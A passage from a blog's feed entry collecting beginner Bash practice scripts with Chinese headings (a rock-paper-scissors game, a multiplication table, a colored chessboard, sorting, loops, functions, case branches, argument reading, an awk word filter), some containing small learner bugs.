game[$sum] }</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x8BF7;&#x6839;&#x636E;&#x4E0B;&#x5217;&#x63D0;&#x793A;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x51FA;&#x62F3;&#x624B;&#x52BF;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1. &#x77F3;&#x5934;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2. &#x526A;&#x5200;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3. &#x5E03;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;&#x8BF7;&#x9009;&#x62E9; 1-3:&quot;</span> person</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$person</span> <span class="keyword">in</span></span><br><span class="line">1)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$num</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;&#x5E73;&#x5C40;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$num</span> -eq 1 ]</span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;&#x4F60;&#x8D62;&#x4E86;&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x7535;&#x8111;&#x8D62;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span>;;</span><br><span class="line">2)</span><br><span class="line">   <span class="keyword">if</span> [ <span class="variable">$num</span> -eq 0 ] </span><br><span class="line">   <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x7535;&#x8111;&#x8D62;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$num</span> -eq 1 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x5E73;&#x5C40;&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x4F60;&#x8D62;&#x4E86;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span>;;</span><br><span class="line">3)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$num</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x4F60;&#x8D62;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$num</span> -eq 1 ]</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x7535;&#x8111;&#x8D62;&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&#x5E73;&#x5C40;&quot;</span></span><br><span class="line">    <span class="keyword">fi</span>;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x5FC5;&#x987B;&#x8F93;&#x5165;1-3&#x7684;&#x6570;&#x5B57;&quot;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x4E5D;&#x4E5D;&#x4E58;&#x6CD5;&#x8868;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> `seq <span class="variable">$i</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot; <span class="variable">$j</span>*<span class="variable">$i</span>=$[i*j] &quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>if&#x8FD0;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wo ai wenmin&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$1</span> -eq 3 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wo ai wenxing&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$1</span> -eq 4 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wo de xin&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$1</span> -eq 5 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wo de ai&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6253;&#x5370;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x68CB;&#x76D8;</span></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;i &#x548C; j&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x884C;&#xFF0C;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5217;&#xFF0C;&#x56FD;&#x9645;&#x8C61;&#x68CB;&#x4E3A; 8x8&#x68CB;&#x76D8;</span></span><br><span class="line"><span class="comment"># i=1 &#x662F;&#x4EE3;&#x8868;&#x51C6;&#x5907;&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;&#x68CB;&#x76D8;&#xFF0C;&#x7B2C;1&#x884C;&#x68CB;&#x76D8;&#x6709;&#x7070;&#x8272;&#x548C;&#x84DD;&#x8272;&#x95F4;&#x9694;&#x8F93;&#x51FA;&#xFF0C;&#x603B;&#x5171;&#x4E3A;8&#x5217;</span></span><br><span class="line"><span class="comment"># i=1 &#xFF0C;j=1 &#x4EE3;&#x8868;&#x7B2C;1&#x884C;&#x7684;&#x7B2C;1&#x5217;&#xFF0C;i=2&#xFF0C;j=3&#x4EE3;&#x8868;&#x7B2C;2&#x884C;&#x7684;&#x7B2C;3&#x5217;</span></span><br><span class="line"><span class="comment"># &#x68CB;&#x76D8;&#x7684;&#x89C4;&#x5F8B;&#x662F; i+j &#x5982;&#x679C;&#x662F;&#x5076;&#x6570;&#xFF0C;&#x5C31;&#x6253;&#x5370;&#x84DD;&#x8272;&#x8272;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x6280;&#x672F;&#x5C31;&#x6253;&#x5370;&#x7070;&#x8272;&#x8272;&#x5757;</span></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528; echo -ne &#x6253;&#x5370;&#x8272;&#x5757;&#xFF0C;&#x5E76;&#x4E14;&#x6253;&#x5370;&#x5B8C;&#x6210;&#x8272;&#x5757;&#x540E;&#x4E0D;&#x81EA;&#x52A8;&#x6362;&#x884C;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x884C;&#x7EE7;&#x7EED;&#x8F93;&#x51FA;&#x5176;&#x4ED6;&#x8272;&#x5757;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> {1..8}</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> {1..8}</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        sum=$[ i+j ]</span><br><span class="line">        <span class="keyword">if</span> [ $[sum%2] -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> -ne <span class="string">&quot;\033[46m \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> -ne <span class="string">&quot;\033[47m \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x4F7F;&#x7528;&#x811A;&#x672C;&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x4E09;&#x4E2A;&#x6574;&#x6570;&#x8FDB;&#x884C;&#x6392;&#x5E8F;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4E00;&#x6B21;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;3&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x811A;&#x672C;&#x6839;&#x636E;&#x6570;&#x5B57;&#x5927;&#x5C0F;&#x4F9D;&#x6B21;&#x6392;&#x5E8F;&#x8F93;&#x51FA;3&#x4E2A;&#x6570;&#x5B57;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot;</span> num1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot;</span> num2</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF1A;&quot;</span> num3</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4E0D;&#x7BA1;&#x8C01;&#x5927;&#x8C01;&#x5C0F;&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x6253;&#x5370; echo &quot;$num1, $num2, $num3&quot;</span></span><br><span class="line"><span class="comment"># num1 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5C0F;&#x7684;&#x503C;&#xFF0C;num2 &#x4E2D;&#x6C38;&#x8FDC;&#x5B58;&#x4E2D;&#x95F4;&#x503C;&#xFF0C; num3&#x6C38;&#x8FDC;&#x5B58;&#x6700;&#x5927;&#x503C;</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4E0D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x987A;&#x5E8F;&#xFF0C;&#x5219;&#x6539;&#x53D8;&#x6570;&#x7684;&#x5B58;&#x50A8;&#x4E66;&#x5E8F;&#xFF0C;&#x5982;&#xFF1A;&#x53EF;&#x4EE5;&#x5C06;num1&#x548C;num2&#x7684;&#x503C;&#x5BF9;&#x8C03;</span></span><br><span class="line"></span><br><span class="line">tmp=0</span><br><span class="line"><span class="comment"># &#x5982;&#x679C;num1 &#x5927;&#x4E8E; num2 &#xFF0C;&#x5C31;&#x628A;num1&#x548C;num2&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$num1</span> -gt <span class="variable">$num2</span> ]; <span class="keyword">then</span></span><br><span class="line">    tmp=<span class="variable">$num1</span></span><br><span class="line">    num1=<span class="variable">$num2</span></span><br><span class="line">    num2=tmp</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;num1&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num1&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num1&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$num1</span> -gt <span class="variable">$num3</span> ]; <span class="keyword">then</span></span><br><span class="line">    tmp=<span class="variable">$num1</span></span><br><span class="line">    num1=<span class="variable">$num3</span></span><br><span class="line">    num3=<span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;num2&#x5927;&#x4E8E;num3&#xFF0C;&#x5C31;&#x628A;num2&#x548C;num3&#x7684;&#x503C;&#x4EA4;&#x6362;&#xFF0C;&#x786E;&#x4FDD;num2&#x7684;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x7684;&#x662F;&#x6700;&#x5C0F;&#x503C;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$num2</span> -gt <span class="variable">$num3</span> ]; <span class="keyword">then</span></span><br><span class="line">    tmp=<span class="variable">$num2</span></span><br><span class="line">    num2=<span class="variable">$num3</span></span><br><span class="line">    num3=<span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF08;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#xFF09;&#x4E3A;&#xFF1A;<span class="variable">$num1</span>,<span class="variable">$num2</span>,<span class="variable">$num3</span>&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>for&#x5FAA;&#x73AF;&#x5224;&#x65AD;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">s=0;</span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;100;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    s=$[<span class="variable">$s</span>+<span class="variable">$i</span>]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$s</span></span><br><span class="line"></span><br><span class="line">r=0;</span><br><span class="line">a=0;</span><br><span class="line">b=0;</span><br><span class="line"><span class="keyword">for</span>((x=1; x&lt;9; x++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    a=$[<span class="variable">$a</span>+<span class="variable">$x</span>]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$x</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((y=1; y&lt;9; y++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    b=$[<span class="variable">$b</span>+<span class="variable">$y</span>]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$y</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$r</span>=$[<span class="variable">$a</span>+<span class="variable">$b</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;$*&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wenmin xihua <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wenmin xihuan <span class="variable">$j</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><hr><p><strong>&#x4F7F;&#x7528;&#x51FD;&#x6570; &#x6C42;&#x548C;&#x8FD0;&#x7B97;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">sum</span></span>() {</span><br><span class="line">    s=0;</span><br><span class="line">    s=$[<span class="variable">$1</span>+<span class="variable">$2</span>]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$s</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;input your parameter &quot;</span> p1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;input your parameter &quot;</span> p2</span><br><span class="line"></span><br><span class="line">sum <span class="variable">$p1</span> <span class="variable">$p2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">multi</span></span>() {</span><br><span class="line">    r=0;</span><br><span class="line">    r=$[<span class="variable">$1</span>/<span class="variable">$2</span>]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$r</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;input your parameter &quot;</span> x1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;input your parameter &quot;</span> x2</span><br><span class="line"></span><br><span class="line">multi <span class="variable">$x1</span> <span class="variable">$x2</span></span><br><span class="line"></span><br><span class="line">v1=1</span><br><span class="line">v2=2</span><br><span class="line"><span class="built_in">let</span> v3=<span class="variable">$v1</span>+<span class="variable">$v2</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$v3</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>case&#x2014;&#x2014;esac&#x5206;&#x652F;&#x7ED3;&#x6784;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wenmin &quot;</span></span><br><span class="line">    ;;</span><br><span class="line">2)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wenxing &quot;</span></span><br><span class="line">    ;;</span><br><span class="line">3)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;wemchang &quot;</span></span><br><span class="line">    ;;</span><br><span class="line">4)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;yijun&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">5)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;sinian&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">6)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;sikeng&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">7)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;yanna&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;danlian&quot;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x5BF9;&#x53D8;&#x91CF;&#x7684;&#x4F20;&#x5165;&#x4E0E;&#x83B7;&#x53D6;&#x4E2A;&#x6570;&#x53CA;&#x6253;&#x5370;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span> <span class="variable">$1</span> <span class="variable">$2</span> <span class="variable">$3</span>&quot;</span>  //&#x4F20;&#x5165;&#x56DB;&#x4E2A;&#x53C2;&#x6570;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span> // &#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x6570;&#x91CF;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$@</span> //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;</span><br><span class="line"><span class="built_in">echo</span> $* //&#x6253;&#x5370;&#x83B7;&#x53D6;&#x4F20;&#x5165;&#x53C2;&#x6570;</span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x811A;&#x672C;&#x5B9A;&#x4E49;while&#x5FAA;&#x73AF;&#x8BED;&#x53E5;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">s=0</span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 100 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    s=$[<span class="variable">$s</span> + <span class="variable">$i</span> ]</span><br><span class="line">    i=$[<span class="variable">$i</span> + 1]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$s</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$i</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><p><strong>&#x8BFB;&#x53D6;&#x63A7;&#x5236;&#x53F0;&#x4F20;&#x5165;&#x53C2;&#x6570;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -t 7 -p <span class="string">&quot;input your name &quot;</span> NAME</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$NAME</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -t 11 -p <span class="string">&quot;input you age &quot;</span> AGE</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$AGE</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -t 15 -p <span class="string">&quot;input your friend &quot;</span> FRIEND</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FRIEND</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -t 16 -p <span class="string">&quot;input your love &quot;</span> LOVE</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$LOVE</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6253;&#x5370;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD;</strong></p><blockquote><p><strong>&#x63CF;&#x8FF0;</strong><br>&#x5199;&#x4E00;&#x4E2A;bash&#x811A;&#x672C;&#x4EE5;&#x7EDF;&#x8BA1;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6587;&#x4EF6;nowcoder.txt&#x4E2D;&#x5B57;&#x6BCD;&#x6570;&#x5C0F;&#x4E8E;8&#x7684;&#x5355;&#x8BCD;<br>&#x793A;&#x4F8B;&#xFF1A;<br>&#x5047;&#x8BBE;nowcoder.txt&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;<br>how they are implemented and applied in computer<br>&#x4F60;&#x7684;&#x811A;&#x672C;&#x5E94;&#x5F53;&#x8F93;&#x51FA;&#xFF1A;<br>how<br>they<br>are<br>and<br>applied<br>in<br>&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x8981;&#x62C5;&#x5FC3;&#x4F60;&#x8F93;&#x51FA;&#x7684;&#x7A7A;&#x683C;&#x4EE5;&#x53CA;&#x6362;&#x884C;&#x7684;&#x95EE;&#x9898;</p></blockquote><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN{FS=&quot;&quot;;RS=&quot; &quot;;ORS=&quot;\n&quot;}{if(NF&lt;8)print$0}&apos; nowcoder.txt</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Hello World&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL脚本工具</title>
    <link href="https://marnm.github.io//posts/f42b90f9/"/>
